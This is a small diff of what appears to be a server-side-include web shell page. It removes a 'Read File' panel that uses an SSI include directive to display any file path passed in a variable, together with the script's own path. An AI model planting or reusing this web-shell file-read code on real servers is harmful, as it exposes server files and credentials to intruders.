@@ -235,18 +235,7 @@ Shell with Server Side Inclusion Shell
 <br>
 </div>
 <br>
-<div align=left width=100% border=0 style=background-color:#000000; class="area123">
-<b><font size=+1>Read File</font></b>
-<br><br>
-<b><font color=white>Current File Absolute Path</font></b>:&nbsp;&nbsp;&nbsp;<!--#echo var=SCRIPT_FILENAME -->&nbsp;<br>
-<br>
-<b><font color=white>Trying to Read File</font></b>:&nbsp;&nbsp;&nbsp;<b><!--#echo var=inc --></b><br>
-<br>
-<pre>
-<!--#include virtual=$inc -->
-</pre>
-<br>
-</div>
+
 <br>
 </body>
 </html>
